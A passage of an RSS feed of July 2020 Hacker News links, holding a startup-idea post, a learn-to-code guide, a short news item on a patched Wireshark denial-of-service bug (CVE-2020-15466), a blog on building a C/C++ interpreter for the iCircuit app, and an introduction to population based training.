<![CDATA[Show HN: Play Hex against our RL agent]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739873">thread link</a>) | @natufunu
<br/>
July 5, 2020 | https://cleeff.github.io/hex | <a href="https://web.archive.org/web/*/https://cleeff.github.io/hex">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://cleeff.github.io/hex</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739873</guid>
            <pubDate>Sun, 05 Jul 2020 16:30:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Installment Subscription]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739829">thread link</a>) | @mikeberv
<br/>
July 5, 2020 | https://www.billiondollarstartupideas.com/ideas/installment-subscription | <a href="https://web.archive.org/web/*/https://www.billiondollarstartupideas.com/ideas/installment-subscription">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1593965992303" id="item-5f01f8bcc7077935484de88c"><div><div><div data-block-type="2" id="block-68653710b4fd3b7e6d4e"><div><p><strong>Problem: </strong>When you subscribe to something, you don’t built any equity or ownership. As soon as you cancel your subscription, you lose access to whatever you used to have. This phenomenon also happens with rent.</p><p><strong>Solution: </strong>A platform that specializes in creating financial instruments focused on the intersection of monthly subscriptions &amp; marginal cost to own. For example, Disney recently released Hamilton on Disney+ (<a href="https://www.theverge.com/2020/5/12/21255693/hamilton-musical-disney-plus-early-release-date-streaming-broadway-miranda">over a year early, too</a>) and is requiring that people subscribe to Disney+ in order to access it. What if, in addition, Disney allowed people to download the video and own it at a marginal cost, like an additional $0.99 or $4.99? Since subscriptions are often in the back of consumers’ minds (they only pay once a year or once a month) it’s much easier to sell add-ons to consumers once they are already on a subscription service.</p><p>This business would take a model that is already proven in gaming (in-game purchases) to generate new revenue sources for subscription companies. This model is extremely successful in gaming (<a href="https://www.gamesindustry.biz/articles/2018-06-27-69-percent-of-fortnite-players-have-bought-in-game-purchases-average-spend-is-usd85">69% of Fortnite players have bought in-game purchases and the average spend is $85</a>, netting <a href="https://www.businessinsider.com/how-much-money-does-fortnite-make-2019-1#:~:text=More%20specifically%3A%20%22Fortnite%22%20made,revenue%20numbers%20for%20%22Fortnite.%22">over $2.5 billion annually</a>), but has not been applied in other contexts. In their article on how the “<a href="https://www.theinformation.com/articles/pandemic-forces-studios-to-think-outside-the-box-on-movie-releases?utm_campaign=article_email&amp;utm_content=article-4411&amp;utm_medium=email&amp;utm_source=sg">Pandemic Forces Studios to Think Outside the Box on Movie Releases</a>,” <a href="https://www.theinformation.com/reporters/jessica-toonkel">Jessica Toonkel</a> and <a href="https://www.theinformation.com/reporters/tom-dotan">Tom Dotan</a> describe the pros and cons of a similar rent-to-buy option:</p><blockquote><p><strong>Introduce a rent-to-buy option.</strong>&nbsp;Give consumers the option, once they have rented a movie, to pay a little extra to own the film.&nbsp;</p><p><strong>Pros:</strong>&nbsp;This could drive more purchases of movies, as people would only fork over the extra money once they know they’ll like it enough to watch it again.&nbsp;</p><p><strong>Cons</strong>: Such an approach would only work for certain kinds of films, particularly children’s movies that kids are likely to watch repeatedly.</p></blockquote><p>This would be an innovation on the subscription-as-a-service and general subscription-based business models that have been extremely popular given the democratization of the internet.</p><p><strong>Monetization: </strong>Selling installment subscriptions as a service, or building a platform that takes a percentage of revenues to create these unique installment subscriptions.</p><p><strong>Contributed by: </strong><a href="https://www.michaelbervell.com/">Michael Bervell</a> (Billion Dollar Startup Ideas)</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.billiondollarstartupideas.com/ideas/installment-subscription</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739829</guid>
            <pubDate>Sun, 05 Jul 2020 16:25:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Here Is What You Need To Know Before Learning Code. Bookmark This Guide]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23739809">thread link</a>) | @yassinerajallah
<br/>
July 5, 2020 | https://devhypercharged.com/here-is-what-you-need-to-know-before-learning-how-to-code-bookmark-this-guide/ | <a href="https://web.archive.org/web/*/https://devhypercharged.com/here-is-what-you-need-to-know-before-learning-how-to-code-bookmark-this-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
			
<p>Before starting out, I’d like to take a minute to thank you for reading &amp; sharing my last article<span>&nbsp;</span><em><a href="https://devhypercharged.com/the-7-traps-that-make-your-software-unusable/">“You Need To Know These 7 Traps That Make Your Software Useless”</a></em></p>
<p>Since we have numerous new members joining the club, feel free to send me your requests, topics, comments, advice, and I’ll make sure to reply to each one of your emails!</p>
<p>Without further ado, let’s dive in.</p>
<p>Learning how to code can be daunting, the progress is slow, the concepts are unique, and the positive feedback loop that will keep you motivated is hard to maintain. Countless are the articles that tell you should learn some framework X because it’s the future or master a language Y because it’s robust. Personally, I wouldn’t have learned multiple stacks (Deep learning, iOS dev, Android dev, Game dev, Cloud services) had I found the right source to guide me. And this is what I wished I had known:</p>
<p>Before choosing what programming language/framework to learn, let’s establish these first principles:</p>
<h3><strong>Programming is an investment&nbsp;</strong></h3>
<p>Learning programming and taking it to the next level are two different things, this is what you’ll be working with for years to come, the market is competitive but you definitely have a spot – if you work hard+smart enough. You don’t need to be a genius but willing to sit down and work. Had I told anyone I wanted to learn deep learning when I was still a freshman with 0 experience in coding, they’d have laughed their life off.</p>
<p>When you pick a programming language, you’ll start building “assets”. Think of assets as utilities that help you in video games. The harder the level, the more you need them to win fast. Typically, after 2 or 3 side projects, you’ll be having a folder full of code snippets that will save you hours! (I’m constantly taking code from projects I’ve finished 3 years ago)</p>
<p>No, you don’t need to stick with your programming language and you can always bounce off to something else. That might sound counter-intuitive, but at least before switching, you’ll have an important cognitive asset:</p>
<ul>
<li>The ability to make complex decisions fast.</li>
<li>Knowing how to learn the new programming language/framework faster &amp; more reliably</li>
<li>Apply the same general concepts onto the new PL</li>
</ul>
<p>However, I don’t recommend switching areas frequently unless you have a valid technical reason for doing so.</p>
<h3><strong>You can’t skip the basics</strong></h3>
<p>Not fun to hear, I’m fully aware. But learning the basics is your first step into programming. Here, you build your tools, learn facts, and polish your skills. Many people struggle with this phase, and when stuck, they think programming isn’t for them.</p>
<p>Think of this step as learning how to reason in sequence. The human brain is a supercomputer on steroids, 1 + 1 appears trivial since you are looking at an equation from a top view. However, the machine only gets to look at 1 operand at a time, so you have to declare your intentions first then tell it what to do with your intentions.</p>
<p>Finally, you elevate your reasoning by solving a real-world problem using an algorithm (a set of instructions).</p>
<p>Again, it doesn’t have to be daunting or scary, as I always say, take an hour or two a day and learn at your own pace. Don’t compare with others because chances are you’ll feel overtaken. And there is no room for intelligence or stupidity in learning code. Only actions and results.</p>
<p>To close off this first part, I invite you to experiment and try whatever works for you. This isn’t the absolute rule on how to learn how to code. If the analogies aren’t that practical for you then great! set your own. If my logic is flawed, then also great, rethink yours! It’s always great to experiment.</p>
<p>Now let’s get you started with choosing the right platform, here is what you should know:</p>
<h2><strong>Gaming<span>&nbsp;</span></strong></h2>
<ul>
<li>Unity is your friend. I still remember the day I decided to make games and become a game dev. The language is C# and unbelievably easy to learn.</li>
<li>Some people prefer using Xcode, but the software is platform restricted, and from my experience, I found it a thousand times easier to learn game dev on Unity than Xcode</li>
<li>The game engine (Unity) does the heavy lifting, you tell the objects to move by a given speed and whether they can collide or not, and there you go, the embedded physics kick in</li>
<li>You’ll have a huge boost by learning design using Blender (An open-source software for design and animation) or similar. Nevertheless, it’s not required, but there will be instances when you wish you’d known how to design</li>
<li>You can compile your game for whatever platform! (Desktop, consoles, web, mobile, etc..) Check out<span>&nbsp;</span><a href="https://unity.com/features/multiplatform">this link</a><span>&nbsp;</span>for more info</li>
<li>The industry is competitive and requires a lot of discipline since you’ll be working long hours. Some like it some don’t, it’s up to you to decide</li>
<li>You are restricted a bit in terms of employment. There are only as many game dev companies out there, and if you don’t like the domain anymore, you’ll need to learn another skill instead of reusing what you already know</li>
<li>Game physics are annoying sometimes, however, the more you learn, the easier it gets – Classic debugging scenario. Game dev is inherently time-consuming given the small details to address. Also, often you’ll get unwanted guests: Bugs. The combinations of physics are near unlimited, sometimes you’ll find yourself debugging for 5 hours a small bug that you simply can’t fix. In this scenario, you can get help from someone you know or revert back to online forums.</li>
<li>No, you won’t make “easy” money with game development. It will take a bit of time to learn how to make smooth, flawless mechanics. So if you are doing it for the money only, maybe you want to save yourself the frustration.</li>
<li>If you are doing it by passion, by no means try it out! you’ll have so much fun creating weird games. Let your imagination go wild, it only gets better from there!</li>
</ul>
<h2><strong>Competitive Programming</strong></h2>
<ul>
<li>Simply practice and resilience: Back in freshman year, I decided to dive into competitive programming. It sounded nerdy and cool. I finished the “cracking the coding interview” by Google. Which contains 150 programming interview questions. I noticed slight progress given the giant amount of work I had to endure for a full summer.</li>
<li>If you want to make money through this, you sure love making money the hard way, but it’s doable. Nevertheless, this is a great way to get into big techs if you rank top in programming contests.</li>
<li>You only remember as much as you practice. The hidden trump card about Competitive programming isn’t the difficulty of the problems but how prepared are you. You don’t have to remember how you solved a problem but where you missed. If you stop practicing, you’ll feel you lost that ‘cognitive prowess’ that helped you draw links between multiple parts of the question.</li>
<li>More often than not, the standard programming language is C++. Python is on the rise too.</li>
</ul>
<h2><strong>Mobile Development</strong></h2>
<ul>
<li>Android or iOS, it’s up to you to choose. I prefer coding for iOS (Swift) because it feels much cleaner. Back in Android (Java/Kotlin), I had to deal with preliminary problems like fixing “Gradle” after an update to just get the project going. Also, I felt that Android was a bit messy to code for in a native language. So I switched to iOS.</li>
<li>iOS is more restricted, you need to pay $100/year for the Apple Developer Program. Also, you need the membership if you want to include advanced features in your app such as Deep Links, notifications, background activity, etc…</li>
<li>Android on the other side, you pay $25 for a<span>&nbsp;</span><strong>lifetime.</strong><span>&nbsp;</span>You submit as many apps as you want, and no one is restricting you in any way. You have a wide audience of developers and potential users waiting for your app. But on the other side, you are competing with more people.</li>
<li>Why not both? Use a framework! I learned both Android &amp; iOS dev and now I’m switching completely to Flutter (more on this in the last paragraph). Using a framework helps with coding for multiple platforms using the same code base. You don’t want to do double the work, and maintaining just 1 app needs<span>&nbsp;</span><strong>many!<span>&nbsp;</span></strong>people. It’s not a matter of “competency” but resources. If I judge by my skills, I don’t need anyone technical on my team, but often than not, I need many people to help me out because there are many small details to take care of.</li>
<li>App developers have a favorable edge in the job market. Mobile users are on the rise. According to BankMyCell, 3.5B people are using their smartphone and it’s only been growing to date</li>
<li>Career-wise, you can work anywhere from the comfort of your home. Also, you ‘ll progress quite fast if you know what you’re doing. Salaries are on the rise too, and the benefits are staggering. Finally, you’re not limited to some predefined companies, you can work for startups, freelance, build your own project, and so on.</li>
<li>This area is getting more &amp; more competitive, and there is a slight switch that is happening, which is the move to software development kits (aka Flutter, React native, etc…). Instead of paying a full-stack mobile dev to write code for 1 platform only, you can have the same code base work for multiple platforms.</li>
</ul>
<h2><strong>Web Development</strong></h2>
<ul>
<li>Web dev is in some serious demand as well. Here you don’t have a predefined programming language because you can literally combine multiple ones, for example: Html + CSS + JS. I never wanted to learn web dev because of javascript. Spaghetti language (sorry!) Also the idea of learning multiple languages to do 1 thing never made sense to me. However, in your case, this isn’t a problem anymore. If you are passionate about creating websites or Web apps, you can go for frameworks such as React Js or Flutter (in Beta). And you’re sorted for life.</li>
<li>No, you don’t need to worry about the “no-code tools” and the “website builders”. These can only help as much. If you want to focus on the backend (servers, technical logic, business logic, etc…) you are in a much better position given that each use case is different. And for a no-code tool to handle that, it’s pretty unreasonable.</li>
<li>Web Development is a dimension in itself. I’m not a web developer and don’t want to snap off someone …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devhypercharged.com/here-is-what-you-need-to-know-before-learning-how-to-code-bookmark-this-guide/">https://devhypercharged.com/here-is-what-you-need-to-know-before-learning-how-to-code-bookmark-this-guide/</a></em></p>]]>
            </description>
            <link>https://devhypercharged.com/here-is-what-you-need-to-know-before-learning-how-to-code-bookmark-this-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739809</guid>
            <pubDate>Sun, 05 Jul 2020 16:23:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bug in Wireshark can be exploited by hackers for Denial of Service(DoS) attack]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739708">thread link</a>) | @vvpvijay
<br/>
July 5, 2020 | https://androidrookies.com/bug-in-wireshark-can-be-exploited-by-hackers-for-denial-of-servicedos-attack/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/bug-in-wireshark-can-be-exploited-by-hackers-for-denial-of-servicedos-attack/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8459"><div><div><div><h2>A flaw in network pentesting tool Wireshark allows hackers to remotely launch Denial of Service (DoS) and make CPU consume more resources</h2><p>If you are a hacker or a security researcher, you have probably used Wireshark. Wireshark is the world’s most popular network protocol analyzer. The software is free and open-source. <a href="https://www.wireshark.org/security/wnpa-sec-2020-09.html">Security researchers</a> have found a new vulnerability in the popular network sniffing tool. This vulnerability has been given the unique identifier <strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15466">CVE-2020-15466</a> and has a severity score of 5.7/10. </strong>The vulnerability could be exploited remotely by potential hackers to make the victim’s PC and CPU consume more resources and launch a denial of service (DoS) attack.</p><p><a href="https://androidrookies.com/the-complete-wireshark-cheat-sheet-to-live-sniff-network-traffic/" target="_blank"><span>The complete Wireshark cheat sheet to live-sniff network traffic</span></a></p><p>The vulnerability in Wireshark versions 3.2.0, 3.2.1, 3.2.2, 3.2.3, 3.2.4 exists due to an infinite loop within the GVCP dissector, allowing remote threat actors to deploy DoS attacks. A malicious hacker can pass a specially designed package tracking file to the vulnerable application, which will consume all system resources, leading to the DoS condition.</p><p>The report says that thought this Wireshark vulnerability can be exploited remotely by hackers, they have not found any evidence of it being exploited in the wild. Security researchers have also not found any malware variants authored to take advantage of the GVCP dissector infinite loop in Wireshark.</p><p>The <a href="https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=16029">Wireshark developers</a> have already fixed the issue and have requested all the Wireshark users to update to the patched Wireshark version 3.2.5 which is available below:</p><div id="dl_box"><div id="accordion_download"><p>Wireshark developers have noted that there is no workaround for this particular vulnerability and Wireshark users have to to download the Wireshark version 3.2.5 to mitigate the risk of exploitation.</p></div></div></div></div></div></article><div><h3>About Author</h3><section> <img alt="" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" data-src="https://secure.gravatar.com/avatar/076b4a64b03cee86288f1132004881ab?s=100&amp;d=mm&amp;r=g" data-srcset="https://secure.gravatar.com/avatar/076b4a64b03cee86288f1132004881ab?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><div> <p>Hacker, coder, Jouno by night
When a good man is hurt, all who would be called good must suffer with him</p></div></section></div></div>]]>
            </description>
            <link>https://androidrookies.com/bug-in-wireshark-can-be-exploited-by-hackers-for-denial-of-servicedos-attack/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739708</guid>
            <pubDate>Sun, 05 Jul 2020 16:11:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Oops, I Wrote a C++ Compiler/Interpreter]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739677">thread link</a>) | @pcr910303
<br/>
July 5, 2020 | https://praeclarum.org/2018/08/27/oops-i-wrote-a-c-compiler.html | <a href="https://web.archive.org/web/*/https://praeclarum.org/2018/08/27/oops-i-wrote-a-c-compiler.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><strong>TL;DR</strong> I wrote a .NET library that can compile C/C++ code into
a byte code that it can also interpret. It is used in my
app <a href="http://icircuitapp.com/">iCircuit</a> to simulate Arduinos.
You can use it yourself with the nuget package <a href="https://www.fuget.org/packages/CLanguage">CLanguage</a>.</p>

<p><img src="https://praeclarum.org/images/2018/cdemo.gif" alt="Arduino code being edited in iCircuit"></p>

<h2 id="arduino-support-for-icircuit">Arduino Support for iCircuit</h2>

<p>The most requested feature for iCircuit, for years, has
been to support Arduino components.
I agreed with all my users that it would be an amazing
feature, but it was also a pretty big request that I wasn’t
sure I could complete.</p>

<p>I could easily add a component that <em>looked</em> like an Arduino -
had all the right pins, maybe even blinked an LED. However,
what people really wanted was a <em>programmable</em> Arduino
integrated into the circuit simulator.</p>

<p>Arduinos are programmed in C++ with a small base library known
as “Wiring”. Therefore, in order to simulate an Arduino, I
needed a C/C++ compiler and I needed to re-implement Wiring. Oh, and that compiler needs to
run on iOS, integrate into my circuit simulation, handle
bad code such as infinite loops and bad pointers, 
work within the sandbox (which means interpretation instead
of real execution), and it has to run on 4 platforms (iOS, Mac, Android, Windows).</p>

<p>Like I said, it was a big request! As tough as all that sounds,
I still personally wanted the feature and decided to find a way
to make it happen. Way back in 2010, I started work.</p>

<p>I first looked around for small C++ compilers and
interpreters that I could
get to work on iOS, Android, and Windows (iCircuit runs everywhere).
Sadly, the research was grim as no compiler
met all my requirements. Some would be nice and small but
only emit X86 code meaning I would have to write an X86 simulator. Others were so big and had so many dependencies
that I just gave up trying to get it to compile for iOS.</p>

<p>Fortunately in 2010, I was full of hubris and I figured now was the time in my life to write a C++ compiler. Oh how foolish…</p>

<h2 id="the-halcyon-days-of-2010">The Halcyon Days of 2010</h2>

<p>Compilers and Interpreters are, in principle, very simple
programs. I’d written a bunch of interpreters at this point
in my career and even wrote a couple simple compilers for very
small languages. I knew that C++ was a complex language, at
least syntactically (with all its type declarations) but that
its semantics - its model of computation - was rather basic.
I considered myself a good C++ programmer and thought I knew
the language inside and out. How hard could it be?</p>

<p>Like I said, hubris.</p>

<p>And so I embarked on writing my C++ compiler in C#
(the language iCircuit is written in).
I started by writing a C compiler because C++ is a monster of a
language. Most Arduino programs only use C features (I thought),
so it seemed like a reasonable starting point.</p>

<h3 id="writing-the-parser">Writing the Parser</h3>

<p>C is nice because you can actually parse it using
a <em>grammar definition</em> - a file that states the syntax of
the language. Grammars are great because you can use a code
generator to automatically create a parser for your language from this 
definition. This means you can focus on the semantics of
the language and let the parser generator deal with the syntax.</p>

<p>Back in 1985 someone posted a <a href="https://www.lysator.liu.se/c/ANSI-C-grammar-y.html">YACC grammar definition for C</a>
which served as my starting point.
I then used the <a href="https://www.cs.rit.edu/~ats/projects/lp/doc/jay/package-summary.html">jay parser generator</a> (the same tools used to generate the mono C# parser)
as my parser generator. This tool takes the grammar definition
and spits out nasty C# code to parse files. The
code is nasty because it’s fast and eschews standard coding
conventions for performance. I love it.</p>

<p>The process of creating the parser went very smoothly thanks
to this. The real work involves creating C# syntax classes
that mirror the grammar. These classes form the Abstract
Syntax Tree (AST) of the compiler. You can see the results
of this work by <a href="https://github.com/praeclarum/CLanguage/blob/master/CLanguage/Parser/CParser.jay">looking at my modified grammar</a>.</p>

<p>I ended up writing a <a href="https://github.com/praeclarum/CLanguage/tree/master/CLanguage/Syntax">variety of syntax classes</a> such as:</p>

<ul>
  <li><code>ForStatement</code> that captures the syntax of <code>for</code> loops</li>
  <li><code>BinaryExpression</code> that handles most math operators such as <code>+</code> and <code>*</code></li>
  <li><code>Block</code> that captures a sequence of statements</li>
</ul>

<p>And this is the point where I realized C was a bit more complex than I liked to think. My syntax classes were filled with scary names like “abstract
specifiers”, “type specifier”, “type qualifier”, “multi declarations”, and so on. I knew C
declarations were nutty but, oh my, they’re a disaster.</p>

<p>I was scared, but combatted that fear by writing a bunch of unit tests.
I figured, yes this problem is hard, but it’s just big - there was an end in sight. Maximum effort would be needed and would, hopefully, be rewarded.</p>

<p>And so I pressed on. I just kept writing sample code after sample code until
I understood how my concept of the language related to this
grammar. After some time, I was able to wrestle all these “specifiers”
into more manageable objects.</p>

<h3 id="definitions-and-types">Definitions and Types</h3>

<p>The next step to writing a compiler is
discovering definitions in code. Variable definitions, function
definitions, type definitions, all that. C and C++ are a little
wild because you can declare things multiple times but you can
only define them once. While C++ is designed to be compiled using
only a single pass over the AST, I ended up writing a multi-pass
compiler with separate stages for declaration discovery, resolution,
and emission.</p>

<p>Once I found declarations and definitions, I needed to build
a type system. Thankfully, at first glance, C’s types are very
basic. You have the machine types (ints and floats), 
structures, and, uh oh, pointers. The compiler would have to munge
around all the code and assemble and unify all these types.
I spent days and days just getting the integers right.</p>

<p>For example, we all know what this means:</p>



<p>But what does</p>

<div><div><pre><code><span>int</span> <span>long</span> <span>long</span> <span>short</span> <span>long</span> <span>foo</span><span>;</span>
</code></pre></div></div>

<p>mean? Unfortunately, that is valid code according to the grammar
I’m using, but it’s obviously not valid C code. 
The compiler has to deal with this kind of craziness.
Not even the integers are simple in C…</p>

<h3 id="emitting-executable-code">Emitting Executable Code</h3>

<p>Now it’s time for the compiler to earn its keep and emit
executable code. Most C compilers would emit X86 or ARM assembly.
However, there was no point in doing that as I can’t natively
execute code on iOS.</p>

<p>I decided to instead devise my own
virtual machine and byte code that would be easy to interpret.
I figured that if I controlled the compiler and the byte code
then I could arrange things to make the interpreter simple
and yet still expressive.</p>

<p>This was a bit of a gamble as it increased the number of
decisions I had to make. However, most byte codes I looked into
were very complex and I knew (I thought) I could keep my code
small and simple.</p>

<p>I settled on a stack-based virtual machine that is very similar
to how the Common Language Runtime (CLR) works. Every function
had a stack and computations were performed by pushing and popping
numbers to and from that stack. This is different from most real
machines like X86 that are <em>register-based</em> not stack-based.
Register-based machines scared me a bit because they reminded
me of very hard to read chapters of very hard to read books.
I knew how to implement them, but I lacked experience with them
and went with the simpler design.</p>

<p>Now that I had a semi-specified byte code and virtual machine,
it was only a matter of translating my syntax tree into byte
code. If you ignore performance, this is a trivial step for the compiler.
You can see, for example, how <code>if</code> statements get compiled by looking at the
<code>DoEmit</code> method of <code>IfStatement</code>:</p>

<div><div><pre><code><span>protected</span> <span>override</span> <span>void</span> <span>DoEmit</span> <span>(</span><span>EmitContext</span> <span>ec</span><span>)</span>
<span>{</span>
    <span>var</span> <span>falseLabel</span> <span>=</span> <span>ec</span><span>.</span><span>DefineLabel</span> <span>();</span>
    <span>var</span> <span>endLabel</span> <span>=</span> <span>ec</span><span>.</span><span>DefineLabel</span> <span>();</span>

    <span>Condition</span><span>.</span><span>Emit</span> <span>(</span><span>ec</span><span>);</span>
    <span>ec</span><span>.</span><span>EmitCastToBoolean</span> <span>(</span><span>Condition</span><span>.</span><span>GetEvaluatedCType</span> <span>(</span><span>ec</span><span>));</span>
    <span>ec</span><span>.</span><span>Emit</span> <span>(</span><span>OpCode</span><span>.</span><span>BranchIfFalse</span><span>,</span> <span>falseLabel</span><span>);</span>

    <span>TrueValue</span><span>.</span><span>Emit</span> <span>(</span><span>ec</span><span>);</span>
    <span>ec</span><span>.</span><span>Emit</span> <span>(</span><span>OpCode</span><span>.</span><span>Jump</span><span>,</span> <span>endLabel</span><span>);</span>

    <span>ec</span><span>.</span><span>EmitLabel</span> <span>(</span><span>falseLabel</span><span>);</span>
    <span>FalseValue</span><span>.</span><span>Emit</span> <span>(</span><span>ec</span><span>);</span>

    <span>ec</span><span>.</span><span>EmitLabel</span> <span>(</span><span>endLabel</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This code first emits the condition. It then emits a branch to one of two
blocks - either the main body (<code>TrueValue</code>) or the <code>else</code> body (<code>FalseValue</code>).</p>

<p>I stole this emit architecture from the mono compiler - always steal from the best.</p>

<p>Most of those early decisions paid off well and after a few weeks
of work I was able to compile and interpret the most basic of
Arduino programs.</p>

<p>It was the hardest I ever had to work to get a stupid LED to blink.</p>

<h3 id="enough">Enough</h3>

<p>But that victory was met by a cold realization
of just how much more work was left to be done.</p>

<p>My compiler was working but it could only do math with 32 bit integers. My clever interpreter was stack based - which,
turns out, is not at all compatible with C’s flat memory model.
I had no idea how I would make real pointers work. I still
didn’t have support for structs. And this was all just for the
C compiler - I still needed to add C++ features!</p>

<p>And so, sadly, I gave up. It’s never easy to admit, but sometimes
problems are just too big for you.</p>

<h2 id="2018">2018</h2>

<p>Eight years is a long time and it’s funny how memories distort. 
I was working on the feature set for iCircuit 2 and Arduino was the first item on that list.
I knew I had a compiler capable of making an LED blink, and my memory
told me the compiler was nearly done it just needed a <em>bit</em> more work.
This time I reopened the code reluctantly, without hubris, mostly
curious to see what I would find.</p>

<p>I was pleasantly surprised to see how much ground I had covered
so long ago. I also realized that my memory betrayed me - the compiler had some
serious defects (no support for strings as a prime example) and that it was
going to be a lot of work to finish it. I remembered why I stopped 8 years ago.</p>

<p>However, after some thought, I decided that it was still useful.
It allowed you to use
the majority of the features of the Arduino and provided all the basics
you needed to write fun programs. 
I decided to release that compiler in <strong>iCircuit 1.9</strong> to 
finally provide the most requested feature of the app.</p>

<p>I was nervous, but very pleased to see that the 
Arduino component quickly became one of the most-used components in the app
and users seemed to love it.</p>

<h3 id="back-to-work">Back …</h3></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://praeclarum.org/2018/08/27/oops-i-wrote-a-c-compiler.html">https://praeclarum.org/2018/08/27/oops-i-wrote-a-c-compiler.html</a></em></p>]]>
            </description>
            <link>https://praeclarum.org/2018/08/27/oops-i-wrote-a-c-compiler.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23739677</guid>
            <pubDate>Sun, 05 Jul 2020 16:06:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Population Based Training]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23739659">thread link</a>) | @keyboardman
<br/>
July 5, 2020 | https://leimao.github.io/blog/Population-Based-Training/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Population-Based-Training/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Training a machine learning model often requires a lot of hyperparameters, such as learning rate and regularization strength. The initial values of the hyperparameters and optionally how the hyperparameters are dynamically tuned during training would have a huge impact on the performance of the optimized model.</p>



<p>Given the combination of hyperparameter schedules are usually infinite, it is often not possible to do exhaustive search to find the best hyperparameter schedule for optimization, even with a lot of computer resources. Instead, what people often do is do hyperparameter grid search to some extent and optionally further fine-tune hyperparameters based on experience with a little bit more trials. While such method works well in practice, it requires a lot of human intervention and possibly miss a better model. Therefore, finding good hyperparameters and hyperparameter tuning approaches during optimization become critical for modeling.</p>



<p>In this blog post, I would like to discuss the <a href="https://arxiv.org/abs/1711.09846">population based training</a>, with a genetic algorithm inspired hyperparameter tuning schedule, proposed by DeepMind.</p>

<h3 id="machine-learning-optimization-theories">Machine Learning Optimization Theories</h3>

<p>Mathematically, a model consists of model parameters $\theta$, and our goal is to maximize or minimize an evaluation objective $Q(\theta)$. Typically, this $Q(\theta)$ already contains the entire model, the validation data, and a performance metric. For example, the evaluation objective for machine translation could be applying the validation data to the model, getting the outputs from the model, and compute the BLEU score, the performance metric, using the model outputs and ground truth labels. The evaluation objective $Q(\theta)$ does not have to be differentiable with respect to the model parameters $\theta$, and sometimes it could even be a black-box!</p>



<p>To maximize or minimize an evaluation objective $Q(\theta)$, we would need to find the optimized model parameters $\theta$, using some optimization techniques. In practice, we don’t want to use the evaluation objective for optimization, or the evaluation objective $Q(\theta)$ could not be directly used for optimization. For instance, the evaluation objective uses validation data and if we use the evaluation objective for optimization, the generalization of the optimized model would be usually poor in practice. Another common obstacle is that some optimization techniques requires the evaluation objective $Q(\theta)$ to be differentiable with respect to the model parameters $\theta$, but sometimes it is not the case.</p>



<p>Since the evaluation objective $Q(\theta)$ could not often be directly used for optimization, and we would propose a <a href="https://www.mathworks.com/help/gads/what-is-surrogate-optimization.html">surrogate objective</a> $\hat{Q}(\theta)$, hoping that by optimizing $\hat{Q}(\theta)$ with respect to the model parameters $\theta$, we would also achieve a good evaluation objective $Q(\theta)$. In machine learning, this surrogate objective is sometimes called training objective, and it contains the training data and the performance metric does not have to be the same to the one used in the evaluation objective. For example, the performance metric we used in machine translation model training is the sum of cross entropies, rather than BLEU score.</p>



<p>With the surrogate objective $\hat{Q}(\theta)$, finding the optimal parameters $\theta^{\ast}$ that maximize or minimize $\hat{Q}(\theta)$ does not happen magically. We would often need to use some optimization techniques to find the optimal parameters $\theta^{\ast}_{\hat{Q}(\theta)}$. Those optimization techniques would often introduce auxillary parameters $h$, which are often called as hyperparameters, to assist the finding of $\theta^{\ast}$. Therefore, given certain optimization techniques, the surrogate objective becomes $\hat{Q}(\theta | h)$. The hyperparameters could be some of the famous ones, such as the learning rate for gradient descent, and the regularization strength to prevent overfitting. However, this introduces some problems. The optimal parameters $\theta^{\ast}_{\hat{Q}(\theta|h)}$ for $\hat{Q}(\theta | h)$ might not be the same to the optimal parameters $\theta^{\ast}_{Q(\theta)}$ for $Q(\theta)$ which we truly care. Different $h$ would lead to different $\theta^{\ast}_{\hat{Q}(\theta|h)}$ and thus different values of $Q(\theta^{\ast}_{\hat{Q}(\theta|h)})$ which might or might not be close to $Q(\theta^{\ast}_{Q(\theta)})$.</p>



